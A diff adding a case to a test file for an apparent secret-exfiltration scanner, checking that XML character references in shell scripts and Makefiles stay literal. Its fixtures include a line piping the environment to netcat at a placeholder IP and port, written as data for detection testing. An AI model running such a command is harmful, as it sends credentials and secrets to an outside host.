@@ -306,6 +306,12 @@ test("a newline character reference still ends a shell command", () => {
 test("XML character references stay literal outside attribute values and outside those files", () => {
   for (const path of ["scripts/bootstrap.sh", "Makefile", "install.sh"]) {
     expect(reported("env &#124; nc 203.0.113.7 4444\n", path)).toEqual([]);
+    expect(
+      reported(
+        "echo '<project name=\"x\">'\nenv &#124; nc 203.0.113.7 4444\n",
+        path,
+      ),
+    ).toEqual([]);
     expect(reported(`${PIPE}\n`, path)).toEqual([
       `${path}:1:secret-exfiltration:high`,
     ]);
